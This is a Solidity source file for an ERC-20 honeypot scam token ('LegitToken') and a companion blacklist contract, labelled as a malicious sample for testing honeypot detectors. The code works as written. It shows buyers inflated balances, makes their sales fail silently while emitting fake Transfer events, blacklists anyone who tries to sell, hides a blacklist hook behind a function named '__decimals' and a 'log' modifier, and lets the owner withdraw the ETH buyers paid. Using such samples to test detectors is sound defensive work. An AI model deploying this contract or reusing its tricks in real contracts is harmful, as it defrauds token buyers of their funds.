// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title HoneypotToken - Educational Honeypot Contract for Security Testing
 * @notice ⚠️ THIS IS A MALICIOUS CONTRACT FOR TESTING PURPOSES ONLY ⚠️
 *
 * This contract demonstrates multiple honeypot techniques:
 * 1. Hidden blacklist that activates after initial purchase
 * 2. balanceOf manipulation (shows fake inflated balances)
 * 3. Transfer restrictions (only owner/whitelisted can sell)
 * 4. Fake Transfer events without actual token movement
 * 5. Hidden external call to blacklist manager
 * 6. Time-locked transfers that never unlock
 *
 * Use this ONLY for testing security detection systems like AgentArc
 *
 * Based on research from:
 * - https://olympixai.medium.com/erc-20-honeypot-scams-a-beginners-guide-and-advanced-detection-techniques-4019ed2300e8
 * - https://github.com/crytic/not-so-smart-contracts/blob/master/honeypots/README.md
 * - https://solidity-by-example.org/hacks/honeypot/
 */
contract HoneypotToken {
    string public name = "LegitToken";
    string public symbol = "LEGIT";
    uint8 public decimals = 18;
    uint256 private _totalSupply = 1000000 * 10**18;

    address public owner;
    address private blacklistManager; // Hidden address that controls blacklist

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _blacklisted;
    mapping(address => bool) private _whitelisted;
    mapping(address => uint256) private _lastBuyTime;

    bool public tradingEnabled = true;
    uint256 private constant UNLOCK_TIME = type(uint256).max; // Never unlocks!
    uint256 private constant BALANCE_MULTIPLIER = 100; // Fake 100x balance

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    // Hidden event that real contracts don't emit
    event BlacklistUpdated(address indexed account, bool status);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    /**
     * @dev Hidden modifier that checks blacklist via external call
     * This is obfuscated as a logging function
     */
    modifier log() {
        if (blacklistManager != address(0)) {
            // External call to blacklist manager (hidden attack vector)
            (bool success, bytes memory data) = blacklistManager.call(
                abi.encodeWithSignature("isBlacklisted(address)", msg.sender)
            );
            if (success && data.length > 0) {
                bool isBlacklisted = abi.decode(data, (bool));
                require(!isBlacklisted, "Address restricted");
            }
        }
        _;
    }

    constructor() {
        owner = msg.sender;
        _whitelisted[owner] = true;
        _balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    /**
     * @dev Set blacklist manager (hidden attack vector)
     * Looks like a decimal updater but actually sets blacklist control
     */
    function __decimals(address _manager) external onlyOwner {
        blacklistManager = _manager;
    }

    /**
     * @dev Returns FAKE inflated balance (Honeypot Technique #1)
     * Shows 100x the actual balance to attract buyers
     */
    function balanceOf(address account) public view returns (uint256) {
        if (account == owner || _whitelisted[account]) {
            return _balances[account];
        }
        // Return fake inflated balance for non-whitelisted accounts
        return _balances[account] * BALANCE_MULTIPLIER;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return _allowances[tokenOwner][spender];
    }

    /**
     * @dev Approve function - works normally to give false confidence
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    /**
     * @dev Transfer function - HONEYPOT!
     * - Only owner and whitelisted can actually transfer
     * - Emits fake Transfer events even when transfer fails
     * - Automatically blacklists buyers after purchase
     * - Checks time lock that never unlocks
     */
    function transfer(address to, uint256 amount) public log returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    /**
     * @dev TransferFrom function - HONEYPOT!
     * Same restrictions as transfer()
     */
    function transferFrom(address from, address to, uint256 amount) public log returns (bool) {
        require(_allowances[from][msg.sender] >= amount, "Insufficient allowance");

        // Try to transfer first
        bool success = _transfer(from, to, amount);

        // Only decrease allowance if transfer succeeded
        if (success) {
            unchecked {
                _allowances[from][msg.sender] -= amount;
            }
        }

        return success;
    }

    /**
     * @dev Internal transfer with hidden restrictions
     */
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        require(from != address(0), "Transfer from zero address");
        require(to != address(0), "Transfer to zero address");
        require(tradingEnabled, "Trading disabled");

        // HONEYPOT TECHNIQUE #3: Only owner and whitelisted can sell
        // Check this FIRST before time lock to avoid underflow issues
        if (!_whitelisted[from] && from != owner) {
            // Automatically blacklist anyone who tries to sell
            _blacklisted[from] = true;
            emit BlacklistUpdated(from, true);

            // Emit fake Transfer event but DON'T actually transfer
            emit Transfer(from, to, amount);
            return false; // Silently fail - looks like success!
        }

        // HONEYPOT TECHNIQUE #2: Time lock check (never unlocks!)
        // Only check for whitelisted users who pass the first check
        if (!_whitelisted[from] && from != owner) {
            require(block.timestamp >= _lastBuyTime[from] + UNLOCK_TIME, "Transfer locked");
        }

        // HONEYPOT TECHNIQUE #4: Check actual balance vs fake balance
        require(_balances[from] >= amount, "Insufficient balance");

        // Actual transfer only for whitelisted
        unchecked {
            _balances[from] -= amount;
            _balances[to] += amount;
        }

        // Track buy time for time-lock honeypot
        if (to != owner && !_whitelisted[to]) {
            _lastBuyTime[to] = block.timestamp;
        }

        emit Transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Owner functions to control the honeypot
     */
    function setWhitelist(address account, bool status) external onlyOwner {
        _whitelisted[account] = status;
    }

    function setBlacklist(address account, bool status) external onlyOwner {
        _blacklisted[account] = status;
        emit BlacklistUpdated(account, status);
    }

    function setTradingEnabled(bool enabled) external onlyOwner {
        tradingEnabled = enabled;
    }

    /**
     * @dev Emergency withdraw - owner can drain all funds
     */
    function emergencyWithdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @dev View functions that look legitimate
     */
    function isWhitelisted(address account) external view returns (bool) {
        return _whitelisted[account];
    }

    function isBlacklisted(address account) external view returns (bool) {
        return _blacklisted[account];
    }

    /**
     * @dev Buy tokens with ETH - simulates a token purchase
     * This allows testing honeypot detection in a realistic scenario
     * User sends ETH and receives tokens, then can't sell them back
     *
     * Price: 1 ETH = 10,000 tokens
     */
    function buy() external payable {
        require(msg.value > 0, "Must send ETH");
        require(tradingEnabled, "Trading disabled");

        // Calculate tokens to give: 1 ETH = 10,000 tokens
        uint256 tokensToGive = msg.value * 10000;

        // Transfer tokens from owner to buyer
        require(_balances[owner] >= tokensToGive, "Insufficient owner balance");

        unchecked {
            _balances[owner] -= tokensToGive;
            _balances[msg.sender] += tokensToGive;
        }

        // Track buy time for time-lock honeypot
        _lastBuyTime[msg.sender] = block.timestamp;

        emit Transfer(owner, msg.sender, tokensToGive);
    }

    /**
     * @dev Receive ETH (for liquidity pool simulation)
     */
    receive() external payable {}
}


/**
 * @title BlacklistManager - External contract to control blacklist
 * @notice This contract works with HoneypotToken to manage blacklists
 */
contract BlacklistManager {
    address public honeypotToken;
    mapping(address => bool) private blacklisted;

    constructor(address _honeypotToken) {
        honeypotToken = _honeypotToken;
    }

    /**
     * @dev Automatically blacklist anyone who bought the token
     * This is called externally by the honeypot token
     */
    function isBlacklisted(address account) external view returns (bool) {
        return blacklisted[account];
    }

    /**
     * @dev Add address to blacklist
     */
    function addToBlacklist(address account) external {
        require(msg.sender == honeypotToken, "Only honeypot can call");
        blacklisted[account] = true;
    }

    /**
     * @dev Auto-blacklist on any interaction
     */
    function trackInteraction(address account) external {
        blacklisted[account] = true;
    }
}
